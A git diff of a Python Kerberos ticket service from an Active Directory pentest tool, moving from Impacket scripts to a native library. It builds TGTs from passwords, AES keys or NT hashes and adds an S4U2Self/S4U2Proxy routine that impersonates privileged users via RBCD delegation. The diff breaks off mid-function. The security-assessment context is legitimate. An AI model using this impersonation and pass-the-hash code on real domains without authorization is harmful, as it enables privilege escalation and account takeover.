@@ -17,11 +17,10 @@ from __future__ import annotations
 
 from dataclasses import dataclass
 from pathlib import Path
-from typing import Any, Callable, Mapping, Optional
+from typing import TYPE_CHECKING, Any, Callable, Mapping, Optional
 import ipaddress
 import os
 import re
-import shlex
 import shutil
 import subprocess
 import sys
@@ -36,17 +35,25 @@ from adscan_internal.command_runner import (
 from adscan_internal.services.base_service import BaseService
 from adscan_internal.core import EventBus, LicenseMode
 from adscan_internal.subprocess_env import get_clean_env_for_compilation
-from adscan_internal.path_utils import get_adscan_home
 from adscan_internal.rich_output import (
     mark_sensitive,
     print_error_debug,
     print_info_debug,
     print_warning_debug,
 )
+from adscan_core.rich_output import (
+    print_error,
+    print_info,
+    print_panel,
+    print_success,
+)
 from adscan_internal.services.credential_store_service import (
     CredentialStoreService,
     KerberosKeyMaterial,
 )
+
+if TYPE_CHECKING:  # pragma: no cover - import-time decoupling only
+    from adscan_internal.services.domain_posture import DomainPosture
 
 
 @dataclass
@@ -69,6 +76,7 @@ class KerberosTGTResult:
     method: str
     success: bool
     error_message: Optional[str] = None
+    error_kind: Optional[str] = None  # e.g. "rc4_disabled"
 
 
 @dataclass
@@ -115,6 +123,123 @@ class KerberosEnvironmentStatus:
     def __post_init__(self) -> None:
         if self.issues is None:
             self.issues = []
+
+
+# ---------------------------------------------------------------------------
+# S4U UX helpers — premium Rich CLI output for forwardable ticket generation
+# ---------------------------------------------------------------------------
+
+_ETYPE_LABELS_S4U: dict[str, str] = {
+    "23": "RC4-HMAC",
+    "17": "AES-128",
+    "18": "AES-256",
+}
+
+_S4U_ERROR_MAP = (
+    (
+        "error code (16)",
+        "Delegation not configured on this account — ensure RBCD is set",
+    ),
+    ("kdc_err_badoption", "KDC rejected S4U — verify RBCD delegation write succeeded"),
+    (
+        "kdc_err_preauth_failed",
+        "Authentication failed — wrong password or AES salt mismatch",
+    ),
+    ("clock skew", "Clock skew too large — sync clocks before retrying"),
+    ("krb_ap_err_skew", "Clock skew too large — sync clocks before retrying"),
+    ("connection refused", "KDC unreachable — verify DC IP and network connectivity"),
+    ("s4u2self failed", "S4U2Self rejected — account may lack delegation rights"),
+    (
+        "s4u2proxy failed",
+        "S4U2Proxy rejected — RBCD target mismatch or delegation not enabled",
+    ),
+)
+
+
+def _etype_label(etype_key: str | None) -> str:
+    return _ETYPE_LABELS_S4U.get(
+        etype_key or "", f"etype {etype_key}" if etype_key else "?"
+    )
+
+
+def _styled_etype_s4u(etype_key: str | None) -> str:
+    label = _etype_label(etype_key)
+    if label.startswith("RC4"):
+        return f"[bold green]{label}[/bold green]"
+    if label.startswith("AES"):
+        return f"[bold yellow]{label}[/bold yellow]"
+    return label
+
+
+def _classify_s4u_error(msg: str) -> str:
+    lower = (msg or "").lower()
+    for marker, friendly in _S4U_ERROR_MAP:
+        if marker in lower:
+            return friendly
+    return msg or "Unknown S4U error"
+
+
+def _render_s4u_preflight(
+    *,
+    domain: str,
+    kdc_ip: str,
+    s4u_account: str,
+    target_user: str,
+    spn: str,
+    ccache_path: str,
+) -> None:
+    from rich.table import Table  # noqa: PLC0415
+
+    tbl = Table.grid(padding=(0, 2))
+    tbl.add_column(style="dim")
+    tbl.add_column()
+    tbl.add_row("Domain", mark_sensitive(domain, "domain"))
+    tbl.add_row("KDC", mark_sensitive(kdc_ip, "ip"))
+    tbl.add_row("Delegating account", mark_sensitive(s4u_account, "user"))
+    tbl.add_row("Impersonate", mark_sensitive(target_user, "user"))
+    tbl.add_row("Service SPN", spn)
+    tbl.add_row("ccache output", ccache_path)
+    print_panel(tbl, title="S4U Forwardable Ticket", border_style="blue")
+
+
+def _render_s4u_step(step: int, name: str, msg: str) -> None:
+    print_info(f"  [{step}/3] [dim]{name}[/dim]  → {msg}")
+
+
+def _render_s4u_step_ok(step: int, name: str, detail: str) -> None:
+    print_success(f"  [{step}/3] [bold]{name}[/bold]  ✓  {detail}")
+
+
+def _render_s4u_step_fail(step: int, name: str, detail: str) -> None:
+    print_error(f"  [{step}/3] [bold]{name}[/bold]  ✗  {detail}")
+
+
+def _render_s4u_ticket_panel(
+    *,
+    target_user: str,
+    spn: str,
+    etype_key: str | None,
+    ccache_path: str,
+    ccache_size: int,
+) -> None:
+    from rich.table import Table  # noqa: PLC0415
+    from rich.text import Text  # noqa: PLC0415
+    from rich.console import Group  # noqa: PLC0415
+
+    tbl = Table.grid(padding=(0, 2))
+    tbl.add_column(style="dim")
+    tbl.add_column()
+    tbl.add_row("Impersonated user", mark_sensitive(target_user, "user"))
+    tbl.add_row("Service SPN", spn)
+    tbl.add_row("Encryption", _styled_etype_s4u(etype_key))
+    tbl.add_row("ccache path", ccache_path)
+    tbl.add_row("ccache size", f"{ccache_size} B")
+    export_hint = Text(f"\nexport KRB5CCNAME={ccache_path}", style="bold cyan")
+    print_panel(
+        Group(tbl, export_hint),
+        title="[bold green]✓  Forwardable Ticket Ready[/bold green]",
+        border_style="green",
+    )
 
 
 class _RichOutputLoggerAdapter:
@@ -213,6 +338,133 @@ class _RichOutputLoggerAdapter:
         print_error_debug(text)
 
 
+def _write_ccache_bytes(ccache_bytes: bytes, ccache_path: Path) -> str:
+    """Write raw ccache bytes to a file and return the path string."""
+    ccache_path.parent.mkdir(parents=True, exist_ok=True)
+    ccache_path.write_bytes(ccache_bytes)
+    return str(ccache_path)
+
+
+async def _s4u_forwardable_ticket_async(
+    *,
+    domain: str,
+    pdc_ip: str,
+    s4u_account: str,
+    s4u_password: str,
+    target_user: str,
+    spn: str,
+    ccache_path: Path,
+) -> "KerberosServiceTicketResult":
+    """Async core for :meth:`KerberosTicketService.create_forwardable_ticket_native`.
+
+    Extracted as a module-level coroutine so both the sync method (via
+    ``asyncio.run()``) and async callers (lab runner, exploitation chains) can
+    invoke it directly without nesting event loops.
+    """
+    import tempfile as _tempfile
+    import urllib.parse as _up
+
+    from adscan_internal.services.kerberos_transport import (  # noqa: PLC0415
+        KerberosConfig,
+        get_tgt,
+    )
+    from kerbad.aioclient import AIOKerberosClient  # noqa: PLC0415
+    from kerbad.common.factory import KerberosClientFactory  # noqa: PLC0415
+    from kerbad.common.spn import KerberosSPN  # noqa: PLC0415
+
+    # ── Step 1: TGT ───────────────────────────────────────────────────────────
+    _render_s4u_step(1, "TGT", f"Authenticating as {s4u_account}...")
+    try:
+        krb_config = KerberosConfig(
+            domain=domain,
+            kdc_ip=pdc_ip,
+            username=s4u_account.rstrip("$"),
+            password=s4u_password,
+        )
+        tgt_bytes = await get_tgt(krb_config)
+    except Exception as exc:
+        msg = _classify_s4u_error(str(exc))
+        _render_s4u_step_fail(1, "TGT", msg)
+        return KerberosServiceTicketResult(
+            target_user=target_user, spn=spn, success=False, error_message=msg
+        )
+
+    with _tempfile.NamedTemporaryFile(
+        suffix=".ccache", prefix="adscan_tgt_", delete=False
+    ) as _tmp:
+        _tgt_path = _tmp.name
+        _tmp.write(tgt_bytes)
+
+    ccache_url = (
+        f"kerberos+ccache://{_up.quote(domain, safe='')}\\{_up.quote(s4u_account.rstrip('$'), safe='')}:"
+        f"{_up.quote(_tgt_path, safe='')}@{pdc_ip}"
+    )
+    factory = KerberosClientFactory.from_url(ccache_url)
+    client: AIOKerberosClient = factory.get_client()
+    client.tgt_from_ccache()
+    _render_s4u_step_ok(1, "TGT", f"ccache {len(tgt_bytes)}B")
+
+    # ── Step 2: S4U2Self ──────────────────────────────────────────────────────
+    _render_s4u_step(2, "S4U2Self", f"Impersonating {target_user}...")
+    try:
+        user_spn = KerberosSPN.from_upn(f"{target_user}@{domain}")
+        tgs_self, _enc_self, _key_self = await client.with_clock_skew(
+            client.S4U2self, user_spn
+        )
+    except Exception as exc:
+        msg = _classify_s4u_error(str(exc))
+        _render_s4u_step_fail(2, "S4U2Self", msg)
+        return KerberosServiceTicketResult(
+            target_user=target_user, spn=spn, success=False, error_message=msg
+        )
+    _render_s4u_step_ok(2, "S4U2Self", f"forwardable ticket for {target_user}")
+
+    # ── Step 3: S4U2Proxy ─────────────────────────────────────────────────────
+    _render_s4u_step(3, "S4U2Proxy", f"Requesting {spn}...")
+    try:
+        svc_spn = KerberosSPN.from_spn(spn, default_realm=domain)
+        _tgs_proxy, _enc_proxy, key_proxy = await client.with_clock_skew(
+            client.S4U2proxy, tgs_self["ticket"], svc_spn
+        )
+    except Exception as exc:
+        msg = _classify_s4u_error(str(exc))
+        _render_s4u_step_fail(3, "S4U2Proxy", msg)
+        return KerberosServiceTicketResult(
+            target_user=target_user, spn=spn, success=False, error_message=msg
+        )
+
+    etype_key: str | None = None
+    try:
+        etype_val = getattr(key_proxy, "enctype", None) or getattr(
+            key_proxy, "etype", None
+        )
+        if etype_val is not None:
+            etype_key = str(int(etype_val))
+    except Exception:
+        pass
+
+    ccache_bytes = client.ccache.to_bytes()
+    ccache_path.write_bytes(ccache_bytes)
+
+    _render_s4u_step_ok(
+        3, "S4U2Proxy", f"[{_etype_label(etype_key)}]  {ccache_path.name}"
+    )
+    _render_s4u_ticket_panel(
+        target_user=target_user,
+        spn=spn,
+        etype_key=etype_key,
+        ccache_path=str(ccache_path),
+        ccache_size=len(ccache_bytes),
+    )
+
+    return KerberosServiceTicketResult(
+        target_user=target_user,
+        spn=spn,
+        success=True,
+        ticket_path=str(ccache_path),
+    )
+
+
 class KerberosTicketService(BaseService):
     """Service responsible for generating Kerberos tickets (TGT).
 
@@ -250,6 +502,7 @@ class KerberosTicketService(BaseService):
         domain: str,
         workspace_dir: str,
         dc_ip: Optional[str] = None,
+        posture_snapshot: Optional["DomainPosture"] = None,
     ) -> KerberosTGTResult:
         """Generate a Kerberos TGT from a password or NTLM hash.
 
@@ -309,6 +562,7 @@ class KerberosTicketService(BaseService):
                     domain=domain,
                     workspace_dir=workspace_dir,
                     dc_ip=dc_ip,
+                    posture_snapshot=posture_snapshot,
                 )
 
             return self._create_tgt_from_password(
@@ -317,6 +571,7 @@ class KerberosTicketService(BaseService):
                 domain=domain,
                 workspace_dir=workspace_dir,
                 dc_ip=dc_ip,
+                posture_snapshot=posture_snapshot,
             )
 
         except Exception as exc:  # pragma: no cover - protección de último recurso
@@ -597,6 +852,63 @@ class KerberosTicketService(BaseService):
             )
             return None
 
+    def try_renew_tgt(self, *, ticket_path: str) -> bool:
+        """Attempt to renew an expired or soon-to-expire TGT in-place.
+
+        Uses ``kinit -R -c <path>`` which asks the KDC to issue a refreshed
+        TGT against the same ccache file.  This only works when:
+        - The original TGT had the RENEWABLE flag set.
+        - The current time is within the ``renew_till`` window.
+
+        Kerberos TGTs on Windows domains typically have a 7-day renewable
+        window even if the initial validity is only 10 hours — so renewal
+        succeeds for sessions that last up to a week.
+
+        Returns:
+            True if the TGT was successfully renewed and the ccache is now valid.
+            False if renewal failed (expired beyond renew_till, kinit absent,
+            or any other error).  The caller should fall back to re-requesting
+            a fresh TGT or to password/NTLM auth.
+        """
+        path = str(ticket_path or "").strip()
+        if not path:
+            return False
+        try:
+            if not Path(path).exists():
+                return False
+        except Exception:
+            return False
+
+        try:
+            clean_env = get_clean_env_for_compilation()
+            clean_env["KRB5CCNAME"] = path
+            proc = self._run_command_logged(
+                label="kinit -R",
+                command=["kinit", "-R", "-c", path],
+                env=clean_env,
+                shell=False,
+            )
+            if proc.returncode == 0:
+                self.logger.info(
+                    "Kerberos TGT renewed successfully (ccache=%s)", path
+                )
+                return True
+            self.logger.debug(
+                "kinit -R failed for %s (rc=%s): %s",
+                path,
+                proc.returncode,
+                str(proc.stderr or proc.stdout or "").strip()[:200],
+            )
+            return False
+        except FileNotFoundError:
+            self.logger.debug("kinit not available — cannot renew TGT")
+            return False
+        except Exception:
+            self.logger.debug(
+                "Unexpected error renewing TGT (path=%s)", path, exc_info=True
+            )
+            return False
+
     # --------------------------------------------------------------------- #
     # Internal helpers
     # --------------------------------------------------------------------- #
@@ -772,143 +1084,87 @@ class KerberosTicketService(BaseService):
         domain: str,
         workspace_dir: str,
         dc_ip: Optional[str],
+        posture_snapshot: Optional["DomainPosture"] = None,
     ) -> KerberosTGTResult:
         """Create a Kerberos TGT using password-based authentication.
 
-        Primero intenta usar el script ``getTGT.py`` de Impacket dentro del
-        venv de Impacket, y si falla o no está disponible, hace fallback a
-        ``kinit`` (paquete ``krb5-user``).
+        Tries the native kerbad async stack first. Falls back to kinit when
+        kerbad raises (e.g. complex password characters, non-standard KDC).
         """
-        # Aseguramos KRB5_CONFIG si existe uno específico de dominio
         self._setup_domain_krb5_config(workspace_dir=workspace_dir, domain=domain)
 
-        final_ccache_path, temp_ccache_path = self._build_ccache_paths(
+        final_ccache_path, _ = self._build_ccache_paths(
             workspace_dir=workspace_dir,
             domain=domain,
             username=username,
         )
 
-        # Intentar primero con impacket
-        adscan_home = get_adscan_home()
-        impacket_venv_path = adscan_home / "tool_venvs" / "impacket" / "venv"
-        get_tgt_script = impacket_venv_path / "bin" / "getTGT.py"
-
-        if not get_tgt_script.exists():
-            self.logger.warning(
-                "Impacket getTGT.py not found at %s, falling back to kinit",
-                get_tgt_script,
-            )
-            return self._create_tgt_with_kinit(
-                username=username,
-                password=password,
-                domain=domain,
-                workspace_dir=workspace_dir,
-                dc_ip=dc_ip,
-            )
-
-        env = get_clean_env_for_compilation()
-        env["KRB5CCNAME"] = str(temp_ccache_path)
-
-        identity = f"{domain}/{username}:{password}"
-        cmd = [str(impacket_venv_path / "bin" / "python"), str(get_tgt_script)]
-        if dc_ip:
-            cmd.extend(["-dc-ip", dc_ip])
-        cmd.append(identity)
-
         self.logger.info(
-            "Creating Kerberos TGT for %s@%s using Impacket getTGT.py",
+            "Creating Kerberos TGT for %s@%s using native kerbad stack",
             username,
             domain,
         )
+
         try:
-            get_tgt_result = self._run_command_logged(
-                label="getTGT.py",
-                command=cmd,
-                env=env,
-                shell=False,
-            )
-        except Exception:  # pragma: no cover - error inesperado
-            self.logger.exception(
-                "Error running getTGT.py for %s@%s", username, domain, exc_info=True
-            )
-            return self._create_tgt_with_kinit(
+            ccache_bytes = self._kerbad_get_tgt_password(
                 username=username,
                 password=password,
                 domain=domain,
-                workspace_dir=workspace_dir,
                 dc_ip=dc_ip,
+                posture_snapshot=posture_snapshot,
             )
-
-        if get_tgt_result.returncode != 0:
-            self.logger.warning(
-                "Impacket getTGT.py failed for %s@%s with exit code %s",
+            _write_ccache_bytes(ccache_bytes, final_ccache_path)
+            os.environ["KRB5CCNAME"] = str(final_ccache_path)
+            self.logger.info(
+                "Kerberos TGT created for %s@%s at %s",
                 username,
                 domain,
-                get_tgt_result.returncode,
+                final_ccache_path,
             )
-            # Fallback a kinit
-            return self._create_tgt_with_kinit(
+            return KerberosTGTResult(
                 username=username,
-                password=password,
                 domain=domain,
-                workspace_dir=workspace_dir,
-                dc_ip=dc_ip,
+                ticket_path=str(final_ccache_path),
+                method="kerberos_password",
+                success=True,
             )
-
-        # Mover ccache a ubicación final si se creó en el cwd
-        default_ccache = Path.cwd() / f"{username}.ccache"
-        if default_ccache.exists():
-            try:
-                default_ccache.rename(temp_ccache_path)
-            except Exception:
-                self.logger.debug(
-                    "Failed to move default ccache from cwd to temp path",
-                    exc_info=True,
-                )
-
-        if not self._finalize_ticket_file(
-            temp_path=temp_ccache_path, final_path=final_ccache_path
-        ):
-            self._log_ticket_paths_state(
-                temp_path=temp_ccache_path,
-                final_path=final_ccache_path,
-                default_path=default_ccache,
-            )
+        except Exception as exc:
             self.logger.warning(
-                "Impacket getTGT.py returned success but ticket file was not created; "
-                "falling back to kinit for %s@%s",
+                "Native kerbad TGT failed for %s@%s (%s), falling back to kinit",
                 username,
                 domain,
-            )
-            return self._create_tgt_with_kinit(
-                username=username,
-                password=password,
-                domain=domain,
-                workspace_dir=workspace_dir,
-                dc_ip=dc_ip,
+                exc,
             )
 
-        self._log_ticket_paths_state(
-            temp_path=temp_ccache_path,
-            final_path=final_ccache_path,
-            default_path=default_ccache,
-        )
-
-        os.environ["KRB5CCNAME"] = str(final_ccache_path)
-
-        self.logger.info(
-            "Kerberos TGT created successfully for %s@%s using Impacket at %s",
-            username,
-            domain,
-            final_ccache_path,
-        )
-        return KerberosTGTResult(
+        return self._create_tgt_with_kinit(
             username=username,
+            password=password,
             domain=domain,
-            ticket_path=str(final_ccache_path),
-            method="impacket_password",
-            success=True,
+            workspace_dir=workspace_dir,
+            dc_ip=dc_ip,
         )
+
+    @staticmethod
+    def _kerbad_get_tgt_password(
+        *,
+        username: str,
+        password: str,
+        domain: str,
+        dc_ip: Optional[str],
+        posture_snapshot: Optional["DomainPosture"] = None,
+    ) -> bytes:
+        """Request a TGT via kerbad native async stack and return ccache bytes."""
+        from adscan_internal.services.async_bridge import run_async_sync
+        from adscan_internal.services.kerberos_transport import KerberosConfig, get_tgt
+
+        config = KerberosConfig(
+            domain=domain,
+            kdc_ip=dc_ip or domain,
+            username=username,
+            password=password,
+            posture_snapshot=posture_snapshot,
+        )
+        return run_async_sync(get_tgt(config))
 
     def _create_tgt_with_kinit(
         self,
@@ -1077,11 +1333,12 @@ class KerberosTicketService(BaseService):
         domain: str,
         workspace_dir: str,
         dc_ip: Optional[str],
+        posture_snapshot: Optional["DomainPosture"] = None,
     ) -> KerberosTGTResult:
-        """Create a Kerberos TGT using AES key material and Impacket getTGT.py."""
+        """Create a Kerberos TGT using AES key material via kerbad native stack."""
         self._setup_domain_krb5_config(workspace_dir=workspace_dir, domain=domain)
 
-        final_ccache_path, temp_ccache_path = self._build_ccache_paths(
+        final_ccache_path, _ = self._build_ccache_paths(
             workspace_dir=workspace_dir,
             domain=domain,
             username=username,
@@ -1096,107 +1353,74 @@ class KerberosTicketService(BaseService):
                 username=username,
                 domain=domain,
                 ticket_path=None,
-                method=f"impacket_{key_kind}",
+                method=f"kerberos_{key_kind}",
                 success=False,
                 error_message=f"Invalid {key_kind} key format",
             )
 
-        adscan_home = get_adscan_home()
-        impacket_venv_path = adscan_home / "tool_venvs" / "impacket" / "venv"
-        get_tgt_script = impacket_venv_path / "bin" / "getTGT.py"
-        if not get_tgt_script.exists():
-            return KerberosTGTResult(
-                username=username,
-                domain=domain,
-                ticket_path=None,
-                method=f"impacket_{key_kind}",
-                success=False,
-                error_message="getTGT.py not found for AES authentication",
-            )
-
-        env = get_clean_env_for_compilation()
-        env["KRB5CCNAME"] = str(temp_ccache_path)
-
-        identity = f"{domain}/{username}"
-        cmd = [str(impacket_venv_path / "bin" / "python"), str(get_tgt_script)]
-        cmd.extend(["-aesKey", clean_aes_key])
-        if dc_ip:
-            cmd.extend(["-dc-ip", dc_ip])
-        cmd.append(identity)
+        self.logger.info(
+            "Creating Kerberos TGT from %s key for %s@%s",
+            key_kind,
+            username,
+            domain,
+        )
 
         try:
-            get_tgt_result = self._run_command_logged(
-                label=f"getTGT.py {key_kind}",
-                command=cmd,
-                env=env,
-                shell=False,
+            from adscan_internal.services.async_bridge import run_async_sync
+            from adscan_internal.services.kerberos_transport import (
+                KerberosConfig,
+                get_tgt,
             )
-        except Exception as exc:  # pragma: no cover - unexpected runtime error
-            self.logger.exception(
-                "Error running getTGT.py for AES key %s@%s",
+
+            config = KerberosConfig(
+                domain=domain,
+                kdc_ip=dc_ip or domain,
+                username=username,
+                aes_key=clean_aes_key,
+                posture_snapshot=posture_snapshot,
+            )
+            ccache_bytes = run_async_sync(get_tgt(config))
+        except Exception as exc:
+            self.logger.warning(
+                "kerbad TGT failed for %s key %s@%s: %s",
+                key_kind,
                 username,
                 domain,
-                exc_info=True,
+                exc,
             )
             return KerberosTGTResult(
                 username=username,
                 domain=domain,
                 ticket_path=None,
-                method=f"impacket_{key_kind}",
+                method=f"kerberos_{key_kind}",
                 success=False,
                 error_message=str(exc),
             )
 
-        if get_tgt_result.returncode != 0:
-            stderr_text = (get_tgt_result.stderr or "").strip()
+        try:
+            _write_ccache_bytes(ccache_bytes, final_ccache_path)
+        except Exception as exc:
             return KerberosTGTResult(
                 username=username,
                 domain=domain,
                 ticket_path=None,
-                method=f"impacket_{key_kind}",
+                method=f"kerberos_{key_kind}",
                 success=False,
-                error_message=stderr_text or "getTGT.py failed",
+                error_message=f"Failed to write ccache: {exc}",
             )
 
-        default_ccache = Path.cwd() / f"{username}.ccache"
-        if default_ccache.exists():
-            try:
-                default_ccache.rename(temp_ccache_path)
-            except Exception:
-                self.logger.debug(
-                    "Failed to move default ccache from cwd to temp path",
-                    exc_info=True,
-                )
-
-        if not self._finalize_ticket_file(
-            temp_path=temp_ccache_path, final_path=final_ccache_path
-        ):
-            self._log_ticket_paths_state(
-                temp_path=temp_ccache_path,
-                final_path=final_ccache_path,
-                default_path=default_ccache,
-            )
-            return KerberosTGTResult(
-                username=username,
-                domain=domain,
-                ticket_path=None,
-                method=f"impacket_{key_kind}",
-                success=False,
-                error_message="Ticket file was not created as expected",
-            )
-
-        self._log_ticket_paths_state(
-            temp_path=temp_ccache_path,
-            final_path=final_ccache_path,
-            default_path=default_ccache,
-        )
         os.environ["KRB5CCNAME"] = str(final_ccache_path)
-
+        self.logger.info(
+            "Kerberos TGT created for %s@%s at %s",
+            username,
+            domain,
+            final_ccache_path,
+        )
         return KerberosTGTResult(
             username=username,
             domain=domain,
             ticket_path=str(final_ccache_path),
-            method=f"impacket_{key_kind}",
+            method=f"kerberos_{key_kind}",
             success=True,
         )
 
@@ -1212,79 +1436,99 @@ class KerberosTicketService(BaseService):
         domain: str,
         workspace_dir: str,
         dc_ip: Optional[str],
+        posture_snapshot: Optional["DomainPosture"] = None,
     ) -> KerberosTGTResult:
-        """Create a Kerberos TGT using NTLM hash and Impacket getTGT.py."""
-        self._setup_domain_krb5_config(workspace_dir=workspace_dir, domain=domain)
+        """Create a Kerberos TGT from an NT hash via kerbad native stack.
 
-        final_ccache_path, temp_ccache_path = self._build_ccache_paths(
+        Detects KDC_ERR_ETYPE_NOTSUPP (RC4 disabled by KDC policy) and returns
+        error_kind="rc4_disabled" so callers can persist this as domain auth posture.
+        """
+        self._setup_domain_krb5_config(workspace_dir=workspace_dir, domain=domain)
+        final_ccache_path, _ = self._build_ccache_paths(
             workspace_dir=workspace_dir,
             domain=domain,
             username=username,
         )
 
-        adscan_home = get_adscan_home()
-        impacket_venv_path = adscan_home / "tool_venvs" / "impacket" / "venv"
-        get_tgt_script = impacket_venv_path / "bin" / "getTGT.py"
-        if not get_tgt_script.exists():
-            self.logger.warning(
-                "Impacket getTGT.py not found at %s, cannot create TGT from NTLM hash",
-                get_tgt_script,
-            )
-            return KerberosTGTResult(
-                username=username,
-                domain=domain,
-                ticket_path=None,
-                method="impacket_ntlm",
-                success=False,
-                error_message="getTGT.py not found for NTLM authentication",
-            )
-
-        # Parsear hash LM:NT o solo NT
+        # Normalize to NT part only (kerbad +nt URL expects 32 hex chars)
         if ":" in ntlm_hash:
-            lm_hash, nt_hash = ntlm_hash.split(":", 1)
+            _, nt_part = ntlm_hash.split(":", 1)
         else:
-            lm_hash = "aad3b435b51404eeaad3b435b51404ee"
-            nt_hash = ntlm_hash
+            nt_part = ntlm_hash
 
         try:
-            bytes.fromhex(lm_hash)
-            bytes.fromhex(nt_hash)
+            bytes.fromhex(nt_part)
+            if len(nt_part) != 32:
+                raise ValueError("NT hash must be exactly 32 hex chars")
         except ValueError:
-            self.logger.warning("Invalid NTLM hash format: %s", ntlm_hash)
             return KerberosTGTResult(
                 username=username,
                 domain=domain,
                 ticket_path=None,
-                method="impacket_ntlm",
+                method="kerberos_ntlm",
                 success=False,
                 error_message="Invalid NTLM hash format",
             )
 
-        env = get_clean_env_for_compilation()
-        env["KRB5CCNAME"] = str(temp_ccache_path)
-
-        identity = f"{domain}/{username}"
-        cmd = [str(impacket_venv_path / "bin" / "python"), str(get_tgt_script)]
-        cmd.extend(["-hashes", f"{lm_hash}:{nt_hash}"])
-        if dc_ip:
-            cmd.extend(["-dc-ip", dc_ip])
-        cmd.append(identity)
-
         self.logger.info(
-            "Creating Kerberos TGT from NTLM hash for %s@%s using Impacket getTGT.py",
+            "Creating Kerberos TGT from NT hash for %s@%s",
             username,
             domain,
         )
+
         try:
-            get_tgt_result = self._run_command_logged(
-                label="getTGT.py NTLM",
-                command=cmd,
-                env=env,
-                shell=False,
+            from adscan_internal.services.async_bridge import run_async_sync
+            from adscan_internal.services.kerberos_transport import (
+                KerberosConfig,
+                KerberosEtypeError,
+                get_tgt,
             )
-        except Exception as exc:  # pragma: no cover - error inesperado
+
+            config = KerberosConfig(
+                domain=domain,
+                kdc_ip=dc_ip or domain,
+                username=username,
+                nt_hash=nt_part,
+                posture_snapshot=posture_snapshot,
+            )
+            ccache_bytes = run_async_sync(get_tgt(config))
+        except KerberosEtypeError as exc:
+            self.logger.warning(
+                "KDC rejected RC4 for %s@%s (KDC_ERR_ETYPE_NOTSUPP) — "
+                "domain requires AES; NT hash cannot authenticate via Kerberos.",
+                username,
+                domain,
+            )
+            return KerberosTGTResult(
+                username=username,
+                domain=domain,
+                ticket_path=None,
+                method="kerberos_ntlm",
+                success=False,
+                error_message=f"KDC_ERR_ETYPE_NOTSUPP: domain requires AES, NT hash cannot use Kerberos: {exc}",
+                error_kind="rc4_disabled",
+            )
+        except Exception as exc:
+            self.logger.warning(
+                "Kerberos TGT request failed for %s@%s: %s",
+                username,
+                domain,
+                exc,
+            )
+            return KerberosTGTResult(
+                username=username,
+                domain=domain,
+                ticket_path=None,
+                method="kerberos_ntlm",
+                success=False,
+                error_message=str(exc),
+            )
+
+        try:
+            ticket_path = _write_ccache_bytes(ccache_bytes, final_ccache_path)
+        except Exception as exc:
             self.logger.exception(
-                "Error running getTGT.py for NTLM hash %s@%s",
+                "Failed to write ccache for %s@%s",
                 username,
                 domain,
                 exc_info=True,
@@ -1293,86 +1537,33 @@ class KerberosTicketService(BaseService):
                 username=username,
                 domain=domain,
                 ticket_path=None,
-                method="impacket_ntlm",
+                method="kerberos_ntlm",
                 success=False,
-                error_message=str(exc),
+                error_message=f"Failed to write ccache: {exc}",
             )
 
-        if get_tgt_result.returncode != 0:
-            stderr_text = (get_tgt_result.stderr or "").strip()
-            self.logger.warning(
-                "Failed to create Kerberos TGT from NTLM hash with getTGT.py "
-                "for %s@%s (exit=%s)",
-                username,
-                domain,
-                get_tgt_result.returncode,
-            )
-            return KerberosTGTResult(
-                username=username,
-                domain=domain,
-                ticket_path=None,
-                method="impacket_ntlm",
-                success=False,
-                error_message=stderr_text or "getTGT.py failed",
-            )
-
-        default_ccache = Path.cwd() / f"{username}.ccache"
-        if default_ccache.exists():
-            try:
-                default_ccache.rename(temp_ccache_path)
-            except Exception:
-                self.logger.debug(
-                    "Failed to move default ccache from cwd to temp path",
-                    exc_info=True,
-                )
-
-        if not self._finalize_ticket_file(
-            temp_path=temp_ccache_path, final_path=final_ccache_path
-        ):
-            self._log_ticket_paths_state(
-                temp_path=temp_ccache_path,
-                final_path=final_ccache_path,
-                default_path=default_ccache,
-            )
-            return KerberosTGTResult(
-                username=username,
-                domain=domain,
-                ticket_path=None,
-                method="impacket_ntlm",
-                success=False,
-                error_message="Ticket file was not created as expected",
-            )
-
-        self._log_ticket_paths_state(
-            temp_path=temp_ccache_path,
-            final_path=final_ccache_path,
-            default_path=default_ccache,
-        )
-
-        os.environ["KRB5CCNAME"] = str(final_ccache_path)
-
+        os.environ["KRB5CCNAME"] = ticket_path
         self.logger.info(
-            "Kerberos TGT from NTLM hash created successfully for %s@%s at %s",
+            "Kerberos TGT created for %s@%s at %s",
             username,
             domain,
-            final_ccache_path,
+            ticket_path,
         )
         return KerberosTGTResult(
             username=username,
             domain=domain,
-            ticket_path=str(final_ccache_path),
-            method="impacket_ntlm",
+            ticket_path=ticket_path,
+            method="kerberos_ntlm",
             success=True,
         )
 
     # ------------------------------------------------------------------ #
-    # Service tickets / S4U helpers (getST.py)
+    # Service tickets / S4U helpers
     # ------------------------------------------------------------------ #
 
-    def create_forwardable_ticket(
+    def create_forwardable_ticket_native(
         self,
         *,
-        impacket_scripts_dir: str,
         domain: str,
         pdc_hostname: str,
         pdc_ip: str,
@@ -1380,154 +1571,63 @@ class KerberosTicketService(BaseService):
         s4u_account: str,
         s4u_password: str,
         service: str = "browser",
-        timeout: int = 300,
-    ) -> KerberosServiceTicketResult:
-        """Create a forwardable ticket for a user using Impacket getST.py (S4U).
+    ) -> "KerberosServiceTicketResult":
+        """Create a forwardable service ticket via native kerbad S4U2Self + S4U2Proxy.
 
-        This is a lower-level helper that encapsulates the ``getST.py`` invocation
-        used by delegation exploitation flows (e.g. RBCD + S4Proxy). It assumes
-        that a suitable TGT is already present in ``KRB5CCNAME``.
+        Replaces the getST.py subprocess call. The ccache is saved using the same
+        naming convention as impacket so downstream flows (launch_s4proxy) can
+        locate it without changes.
 
         Args:
-            impacket_scripts_dir: Directory containing Impacket scripts (getST.py).
-            domain: Target domain name.
-            pdc_hostname: Hostname of the primary domain controller.
-            pdc_ip: IP address of the primary domain controller.
-            target_user: Privileged account to impersonate.
-            s4u_account: Account (user or computer) used for S4U.
-            s4u_password: Password for ``s4u_account``.
-            service: Service part of the SPN (default: ``\"browser\"``).
-            timeout: Maximum execution time in seconds.
+            domain:       Target domain FQDN.
+            pdc_hostname: PDC hostname (used for SPN and ccache filename).
+            pdc_ip:       PDC IP (KDC address).
+            target_user:  Privileged account to impersonate via S4U2Self.
+            s4u_account:  Delegating account (computer$ or user) with S4U rights.
+            s4u_password: Password for *s4u_account*.
+            service:      SPN service class (default ``browser``).
 
         Returns:
-            KerberosServiceTicketResult describing the outcome.
+            :class:`KerberosServiceTicketResult` with ``ticket_path`` on success.
         """
+        from adscan_internal.services.async_bridge import run_async_sync
+
         spn = f"{service}/{pdc_hostname}.{domain}"
-        get_st_path = Path(impacket_scripts_dir).expanduser().resolve() / "getST.py"
+        ccache_filename = (
